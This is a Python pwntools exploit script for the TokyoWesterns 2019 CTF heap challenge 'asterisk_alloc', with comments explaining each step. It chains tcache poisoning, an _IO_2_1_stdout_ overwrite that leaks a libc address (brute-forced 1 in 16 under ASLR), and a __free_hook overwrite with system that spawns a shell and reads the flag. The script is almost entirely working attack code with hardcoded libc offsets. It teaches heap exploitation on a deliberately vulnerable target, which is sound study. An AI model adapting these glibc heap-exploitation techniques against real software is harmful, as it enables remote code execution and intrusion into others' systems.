#!/usr/bin/env python
from pwn import *
import time, struct

context.update(arch='amd64')
#p = remote('ast-alloc.chal.ctf.westerns.tokyo', 10001)

cwd = '/home/puppykitten/CTF/tw19quals/'
bin = os.path.join(cwd, 'asterisk_alloc')

#p = process(bin, cwd=cwd, aslr=False)

def cmd(cmdIdx):
    p.recvuntil("Your choice: ")
    p.sendline(str(cmdIdx)) #we use sendline to get rid of the getchar() as well

def alloc(size, data, typ):
    cmd(typ)
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')


    #setbuf(stdin, 0) is done, so we can send fewer bytes than size, no problem, no \n needed
    p.send(data)

    '''
    if len(data) == size:
        p.send(data)
    elif len(data) < size:
        p.send(data)
    else:
        p.send(data[:size])
    '''

def malloc(size, data):
    alloc(size, data, 1)

def calloc(size, data):
    alloc(size, data, 2)

def realloc(size, data):
    alloc(size, data, 3)

def free(typ):
    assert(typ == 'm' or typ == 'r' or typ == 'c')
    cmd(4)
    p.recvuntil("Which: ")
    p.sendline(str(typ))


'''
This exploit combines tcache poisoning with the _IO_2_1_stdout leak attack.
Normally, we could only execute the tcache poison once, so we also achieve an overlap of a tcache freed
chunk so that we fake its header size. This results in the ability to fake a chunk alloced from tcache
onto another tcache, thus execute the poison attack twice.

1st attack is to leak using the IO technique (4 bit BF only), 2nd attack is to rewrite free_hook (now libc addrs are known)
'''

'''
Expected output:
puppykitten@ubuntu:~/CTF/tw19quals$ python expl_BF.py
[+] Opening connection to ast-alloc.chal.ctf.westerns.tokyo on port 10001: Done
PROGRESS
PROGRESS 2
[*] Closed connection to ast-alloc.chal.ctf.westerns.tokyo port 10001
WRONG LEAK
[+] Opening connection to ast-alloc.chal.ctf.westerns.tokyo on port 10001: Done
PROGRESS
PROGRESS 2
[*] Closed connection to ast-alloc.chal.ctf.westerns.tokyo port 10001
WRONG LEAK
[+] Opening connection to ast-alloc.chal.ctf.westerns.tokyo on port 10001: Done
PROGRESS

[*] Closed connection to ast-alloc.chal.ctf.westerns.tokyo port 10001
[+] Opening connection to ast-alloc.chal.ctf.westerns.tokyo on port 10001: Done
PROGRESS
PROGRESS 2
Libc base: 0x00007ff687dea000
[*] Switching to interactive mode
$ 
$ 
TWCTF{malloc_&_realloc_&_calloc_with_tcache}
'''
#gdb.attach(p)

while(1):
    try:
        #p = process(bin, cwd=cwd, aslr=True)
        p = remote('ast-alloc.chal.ctf.westerns.tokyo', 10001)

        # (1) create a full tcache bin 0x90 at offset +0x500, otherwise clean heap

        realloc(0x890, "abc")
        realloc(0x800, "abc")
        realloc(0, "")  #free the lower chunk to unsorted

        realloc(0x80, "f")
        for i in range(0, 7):
            free('r')   #fill the 0x90 chunk to the tcache
        #free('r')       #free it onto unsorted -> merged with previous to form 0x890 chunk -> entire thing is freed.
                #it all happens in one step, so there is no intermediate step where fd/bk appears;
                #this is why it has to be done twice.

        #realloc(-1, "") #clear ptr_r
        realloc(0, "")  #realloc(0) == free('r') + realloc(-1)

        # (2) set the unsorted bin addr into fd/bk at the +0x500 chunk
    
        realloc(0x890, "abc")
        calloc(0x100, "/bin/sh\x00")    #add the sentinel + RCE free_hook target
        realloc(0x800, "abc")   #now the remainder goes straight to the unsorted
        realloc(0, "")          #now we can merge them together, also clears ptr_r

        # (3) alloc the encompassing chunk to rewrite the prev_size, size, and LSB of fd of the chunk that stayed in the tcache bin 0x90

        #THIS IS THE BRUTEFORCE STEP: the 0x7760 value has a highest nibble that is a guess. It is the correct value for no ASLR, with ASLR it will work 1 times out of 16.

        realloc(0x890, 0x800*"\xAA" + p64(0x810) + p64(0xA1) + p16(0x6760))    #now we prep the fake size for the 0x90 -> this allows to invoke the tcache poison twice. 1 - leak 2 - rce
        #realloc(0x890, 0x800*"\xAA" + p64(0x810) + p64(0xA1) + p16(0x7760))    #now we prep the fake size for the 0x90 -> this allows to invoke the tcache poison twice. 1 - leak 2 - rce

        realloc(-1, "")         #forget this ptr_r, won't need it again
                        #whether we keep this allocted or not does not matter, also works with realloc(0, "")

        # (4) remove the chunk from tcache (poison attack primed)

        malloc(0x80, "AA")      #take it away to prime tcache poison
                        #note: this is interchangeable, could also realloc this, malloc the next, and free('r') twice.

        # (5) execute tcache poison attack 1 -> get libc leak

        realloc(0x80, p64(0xfbad1800) + p64(0)*3 + "\x00")    #now we overwrite the _IO_2_1_stdout_
        #realloc(0x80, p64(0xfbad3c80) + p64(0)*3 + "\x00")    #now we overwrite the _IO_2_1_stdout_
        #<--- both of those magic numbers work!

        print "PROGRESS"

        p.recvuntil(p64(0xffffffffffffffff), timeout = 2)
        p.recvuntil("\x00"*0x8, timeout = 2)

        print "PROGRESS 2"

        leak = u64(p.recv(8))
        libc = leak - 0x3eb780
        if leak == 0x3d3d3d3d3d3d3d3d:
            p.close()
            print "WRONG LEAK"
            continue
        print "Libc base: 0x%016x" % libc

        # (6) execute tcache poison attack 2 -> free it twice onto tcache bin 0xA0 + trigger rce

        free('m')               #we free it back onto the 0xA0 bin twice.
        free('m')

        free_hook = libc + 0x3ed8e8
        system = libc + 0x4f440

        realloc(-1, "")                  #forget the ptr_r
        realloc(0x90, p64(free_hook))    #now realloc it and corrupt the ptr to point to free_hook
        realloc(-1, "")                  #now forget it again
        realloc(0x90, "AA")              #now realloc it again to prime the tcache
        realloc(-1, "")                  #now forget it again
        realloc(0x90, p64(system))       #now trigger tcache poision to overwrite free_hook
        free('c')                        #trigger free rce
        p.sendline("cat flag")
        p.interactive()

    except Exception as e:
        print e
        p.close()
